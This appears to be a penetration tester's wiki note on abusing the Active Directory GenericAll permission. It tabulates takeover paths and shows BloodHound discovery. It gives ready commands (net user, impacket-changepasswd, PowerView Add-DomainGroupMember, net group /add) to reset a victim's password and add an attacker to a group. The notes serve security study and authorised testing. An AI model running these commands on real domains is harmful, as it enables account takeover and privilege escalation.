# GenericAll ACL Abuse

## What it is

`GenericAll` is an Active Directory Access Control Entry (ACE) that grants **full, unrestricted control** over the target AD object. It is the most powerful permission possible short of Domain Admin.

When a user, group, or computer holds `GenericAll` over another object, they can read and write **every attribute** on that object, reset passwords, add members (if it's a group), configure delegation, and more.

## Objects and their GenericAll abuse paths

| Target object type | What GenericAll enables |
|-------------------|------------------------|
| **User** | Reset the user's password (no old password needed) → take over the account |
| **Group** | Add any principal to the group (including yourself) |
| **Computer** | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD attack → impersonate any user on that machine |
| **GPO** | Modify the GPO to execute arbitrary commands on machines it applies to |
| **Domain** | DCSync — replicate all password hashes from the domain |

## Detecting it — BloodHound

GenericAll edges appear in BloodHound as:

```
PRINCIPAL --GenericAll--> TARGET
```

Common query to find abusable paths:
- Right-click any owned node → "Shortest Paths to Domain Admins"
- Look for `GenericAll` or `GenericWrite` edges on computer objects, especially DCs

## Exploiting GenericAll on a User (password reset)

```bash
# Using net (on a Windows machine with the right context)
net user <target_user> <new_password> /domain

# Via Impacket (Linux)
impacket-changepasswd <domain>/<attacker>:'<pass>'@<dc-ip> \
  -newpass '<new_pass>' -targetnewpass '<new_pass>' \
  -altuser <target_user>
```

## Exploiting GenericAll on a Group (add member)

```bash
# PowerView (Windows)
Add-DomainGroupMember -Identity '<group>' -Members '<your_user>'

# net (Windows)
net group "<group>" <your_user> /add /domain
```

## Exploiting GenericAll on a Computer → RBCD

See: [[RBCD (Resource-Based Constrained Delegation)]]

## Related

- [[RBCD (Resource-Based Constrained Delegation)]]
- [[BloodHound — Active Directory Enumeration]]
- [[impacket]]
